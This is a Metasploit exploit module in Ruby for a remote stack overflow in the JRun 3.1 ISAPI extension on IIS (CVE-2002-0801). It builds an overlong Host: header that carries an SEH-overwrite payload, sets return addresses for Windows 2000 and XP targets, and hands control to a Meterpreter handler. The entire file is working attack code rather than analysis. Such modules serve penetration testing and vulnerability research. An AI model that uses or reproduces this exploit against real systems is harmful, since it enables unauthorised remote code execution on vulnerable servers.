##
# $Id$
##

require 'msf/core'

module Msf

class Exploits::Windows::Isapi::JRun31_IIS_Overflow < Msf::Exploit::Remote

	include Exploit::Remote::Tcp
	#include Exploit::Remote::HttpClient
	include Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'JRun 3.1 IIS ISAPI Host String Overflow',
			'Description'    => %q{
				This module exploits a stack overflow in the jrun.dll ISAPI
				application when presented with a long Host: value. Discovered 
				by David Litchfield and successfully tested against Windows 2000 (SP4). 
				Meterpreter payload seems to work best.
					
			},
			'Author'         => [ 'Kurt Grutzmacher < grutz at jingojango dot net >' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 1 $',
			'References'     =>
				[
					[ 'OSVDB', '5082'],
					[ 'CVE', '2002-0801'],
					[ 'URL', 'http://www.nextgenss.com/advisories/jrun.txt'],
					[ 'BID', '4873'],
				],
			'Privileged'     => false,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00\x0a\x0d\x20%-\xff",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        => 
				[
					['Windows 2000 All SP', { 'Rets' => [ 4394, 0x750239af ] }], # pop, pop, ret
					['Windows XP All SP',   { 'Rets' => [ 4394, 0x71abe325 ] }], # pop, pop, ret - untested
					['Windows 2000 SP4', { 'Rets' => [ 4394, 0x780146aa ] }], # pop, pop, ret 
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'May 29 2002'))
			
			register_options(
				[
					OptString.new('URL', [ true,  "Some JSP Script", "/index.jsp" ]),
					Opt::RPORT(80),
					#OptString.new('VHOST', [ false, "Shellcode gets placed here", "shellcode"]),
				], self.class)
	end

	def check
	        ## lame, no checking! ha!
		return Exploit::CheckCode::Unsupported
	end

	def exploit

		connect

		uri = datastore['URL']

		# wake up isapi first
		#sock.put("GET #{uri} HTTP/1.0\r\n\r\n")
		#resp = sock.get_once

		buf = rand_text_alphanumeric(5200)
		print_status("Generating SEH payload for ret -> 0x%.8x..." % target['Rets'][1])
		seh = generate_seh_payload(target['Rets'][1])
		buf[target['Rets'][0]-4, seh.length] = seh

		print_status("Sending request and waiting for 4 seconds...")

		# can't send it this way as it'll add a Host: tag every time ?!

		#datastore['VHOST'] = buf
		#res = send_request_raw({
		#	'uri'		=> '/index.jsp', #datastore['URL'],
		#	'method'	=> 'GET',
		#	'headers'	=> 
		#		'User-Agent'	=> 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
		#	}
		#}, 10)
		#datastore['VHOST'] = '' 	# clear this out

		sock.put("GET #{uri} HTTP/1.0\r\nHost: #{buf}\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n\r\n")
		sleep(4)

		handler
		disconnect
	end

end
end	
